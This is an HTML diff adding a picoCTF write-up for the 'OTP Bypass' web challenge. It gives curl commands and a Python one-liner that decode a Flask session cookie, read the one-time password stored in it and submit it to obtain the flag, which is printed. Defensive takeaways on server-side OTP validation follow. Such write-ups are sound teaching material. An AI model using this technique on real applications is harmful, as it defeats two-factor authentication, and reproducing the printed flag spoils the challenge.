@@ -1,0 +1,179 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>OTP Bypass | Amidst CTF Write-up</title>
+  <link rel="icon" type="image/png" href="../assets/kafka-icon.png">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+  <link rel="stylesheet" href="../style.css">
+  <link rel="stylesheet" href="../writeup.css">
+</head>
+<body>
+  <nav class="navbar scrolled" id="navbar">
+    <div class="nav-container">
+      <a href="../index.html#home" class="nav-logo">
+        <img src="../assets/kafka-icon.png" alt="Logo" class="nav-icon">
+        <span class="logo-bracket">{</span> Amidst <span class="logo-bracket">}</span>
+      </a>
+      <ul class="nav-menu">
+        <li><a href="../index.html#home">Home</a></li>
+        <li><a href="../index.html#about">About</a></li>
+        <li><a href="../index.html#skills">Skills</a></li>
+        <li><a href="../index.html#certifications">Certs</a></li>
+        <li><a href="../index.html#ctf" class="active">CTF</a></li>
+        <li><a href="../index.html#bugbounty">Bug Bounty</a></li>
+        <li><a href="../index.html#labs">Labs</a></li>
+        <li><a href="../index.html#contact">Contact</a></li>
+      </ul>
+    </div>
+  </nav>
+
+  <section class="writeup-header">
+    <div class="container">
+      <a href="../index.html#ctf" class="writeup-back"><i class="fas fa-arrow-left"></i> Back to Write-ups</a>
+      <h1>OTP Bypass</h1>
+      <div class="writeup-meta">
+        <span class="ctf-category web">Web Exploitation</span>
+        <span class="ctf-difficulty easy">Easy</span>
+        <span style="color: var(--text-muted); font-size: 0.85rem;"><i class="fas fa-flag" style="margin-right:5px;"></i>picoCTF</span>
+      </div>
+    </div>
+  </section>
+
+  <section class="writeup-body">
+    <div class="container">
+      <div class="writeup-content">
+        <h2 id="challenge-info">Challenge Info</h2>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Details</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Name</td>
+<td>OTP Bypass</td>
+</tr>
+<tr>
+<td>Category</td>
+<td>Web Exploitation</td>
+</tr>
+<tr>
+<td>Platform</td>
+<td>picoCTF</td>
+</tr>
+<tr>
+<td>URL</td>
+<td><code>http://titan.picoctf.net:58307/</code></td>
+</tr>
+</tbody>
+</table>
+<p><strong>Description:</strong>
+Can you get the flag?</p>
+<hr />
+<h2 id="solution">Solution</h2>
+<h3 id="step-1-explore-the-website">Step 1: Explore the Website</h3>
+<p>The website presents a registration form built with Flask (Python/Werkzeug). There's no login page — only registration with fields for full name, username, phone number, city, and password.</p>
+<pre><code class="language-bash">curl -s http://titan.picoctf.net:58307/
+</code></pre>
+<hr />
+<h3 id="step-2-register-an-account">Step 2: Register an Account</h3>
+<p>Register with any data. The server sets a Flask session cookie and redirects to <code>/dashboard</code>:</p>
+<pre><code class="language-bash"># Get session and CSRF token
+curl -s -c cookies.txt http://titan.picoctf.net:58307/ &gt; /dev/null
+CSRF=$(curl -s -b cookies.txt http://titan.picoctf.net:58307/ \
+  | grep -o 'value=&quot;[^&quot;]*&quot;' | head -1 | cut -d'&quot;' -f2)
+
+# Register
+curl -s -b cookies.txt -c cookies.txt -X POST http://titan.picoctf.net:58307/ \
+  -d &quot;csrf_token=$CSRF&amp;full_name=test&amp;username=test&amp;phone_number=1234567890&amp;city=NYC&amp;password=pass123&quot;
+</code></pre>
+<hr />
+<h3 id="step-3-encounter-the-2fa-page">Step 3: Encounter the 2FA Page</h3>
+<p>After registration, the <code>/dashboard</code> page requires a one-time password (OTP):</p>
+<pre><code class="language-html">&lt;h2&gt;2fa authentication&lt;/h2&gt;
+&lt;form method=&quot;POST&quot;&gt;
+    &lt;input type=&quot;text&quot; name=&quot;otp&quot; placeholder=&quot;Enter OTP&quot;&gt;
+    &lt;button type=&quot;submit&quot;&gt;Submit&lt;/button&gt;
+&lt;/form&gt;
+</code></pre>
+<p>We don't have the OTP — no email or SMS was sent. So where is it?</p>
+<hr />
+<h3 id="step-4-decode-the-flask-session-cookie">Step 4: Decode the Flask Session Cookie</h3>
+<p>Flask stores session data in a <strong>client-side cookie</strong> by default. The cookie is signed (to prevent tampering) but <strong>not encrypted</strong> — meaning we can read its contents.</p>
+<p>The Flask session cookie format is: <code>base64(zlib_compress(json_data)).timestamp.signature</code></p>
+<p>Extract and decode it:</p>
+<pre><code class="language-bash"># View the cookie
+cat cookies.txt
+# session=.eJxlzL0OwjAMBO...
+
+# Decode with Python
+python3 -c &quot;
+import zlib, base64
+
+cookie = '&lt;paste cookie value before first dot&gt;'
+cookie += '=' * (4 - len(cookie) % 4)
+decoded = zlib.decompress(base64.urlsafe_b64decode(cookie))
+print(decoded.decode())
+&quot;
+</code></pre>
+<p><strong>Decoded session data:</strong></p>
+<pre><code class="language-json">{
+  &quot;city&quot;: &quot;NYC&quot;,
+  &quot;csrf_token&quot;: &quot;4fecf3eecc3b681fffb7399cb5ab5cb2590a9c50&quot;,
+  &quot;full_name&quot;: &quot;test&quot;,
+  &quot;otp&quot;: &quot;712185&quot;,
+  &quot;password&quot;: &quot;pass123&quot;,
+  &quot;phone_number&quot;: &quot;1234567890&quot;,
+  &quot;username&quot;: &quot;test&quot;
+}
+</code></pre>
+<p>The OTP is stored right there in the session cookie: <code>"otp": "712185"</code></p>
+<hr />
+<h3 id="step-5-submit-the-otp">Step 5: Submit the OTP</h3>
+<pre><code class="language-bash">curl -s -b cookies.txt -X POST http://titan.picoctf.net:58307/dashboard \
+  -d 'otp=712185'
+</code></pre>
+<p><strong>Result:</strong></p>
+<pre><code>Welcome, test you sucessfully bypassed the OTP request.
+Your Flag: picoCTF{#0TP_Bypvss_SuCc3$S_3e3ddc76}
+</code></pre>
+<hr />
+<h2 id="flag">Flag</h2>
+<pre><code>picoCTF{#0TP_Bypvss_SuCc3$S_3e3ddc76}
+</code></pre>
+<hr />
+<h2 id="key-takeaways">Key Takeaways</h2>
+<ol>
+<li>
+<p><strong>Flask session cookies are readable.</strong> By default, Flask stores session data in a client-side cookie. The cookie is <strong>signed</strong> (so you can't modify it without the secret key) but <strong>not encrypted</strong> (so anyone can read it). Sensitive data like OTP codes should never be stored in the session cookie.</p>
+</li>
+<li>
+<p><strong>OTP must be validated server-side.</strong> A proper 2FA implementation generates the OTP on the server, sends it through a separate channel (SMS, email, authenticator app), and validates it server-side. Storing the OTP in the client's session defeats the entire purpose of two-factor authentication.</p>
+</li>
+<li>
+<p><strong>Always inspect cookies.</strong> In web exploitation challenges, cookies are a common attack surface. Flask cookies in particular can be decoded to reveal sensitive information. Tools like <code>flask-unsign</code> can also be used to decode and even forge Flask session cookies if the secret key is known.</p>
+</li>
+<li>
+<p><strong>Signed does not mean encrypted.</strong> Signing prevents modification — it guarantees the data hasn't been tampered with. Encryption prevents reading — it guarantees the data can't be understood. These are two different properties. Flask's default sessions only provide signing, not encryption.</p>
+</li>
+</ol>
+      </div>
+    </div>
+  </section>
+
+  <footer class="footer">
+    <div class="container">
+      <div class="footer-content">
+        <p class="footer-logo"><span class="logo-bracket">{</span> Amidst <span class="logo-bracket">}</span></p>
+        <p class="footer-copy">&copy; 2026 Amidst. All rights reserved.</p>
+      </div>
+    </div>
+  </footer>
+</body>
+</html>
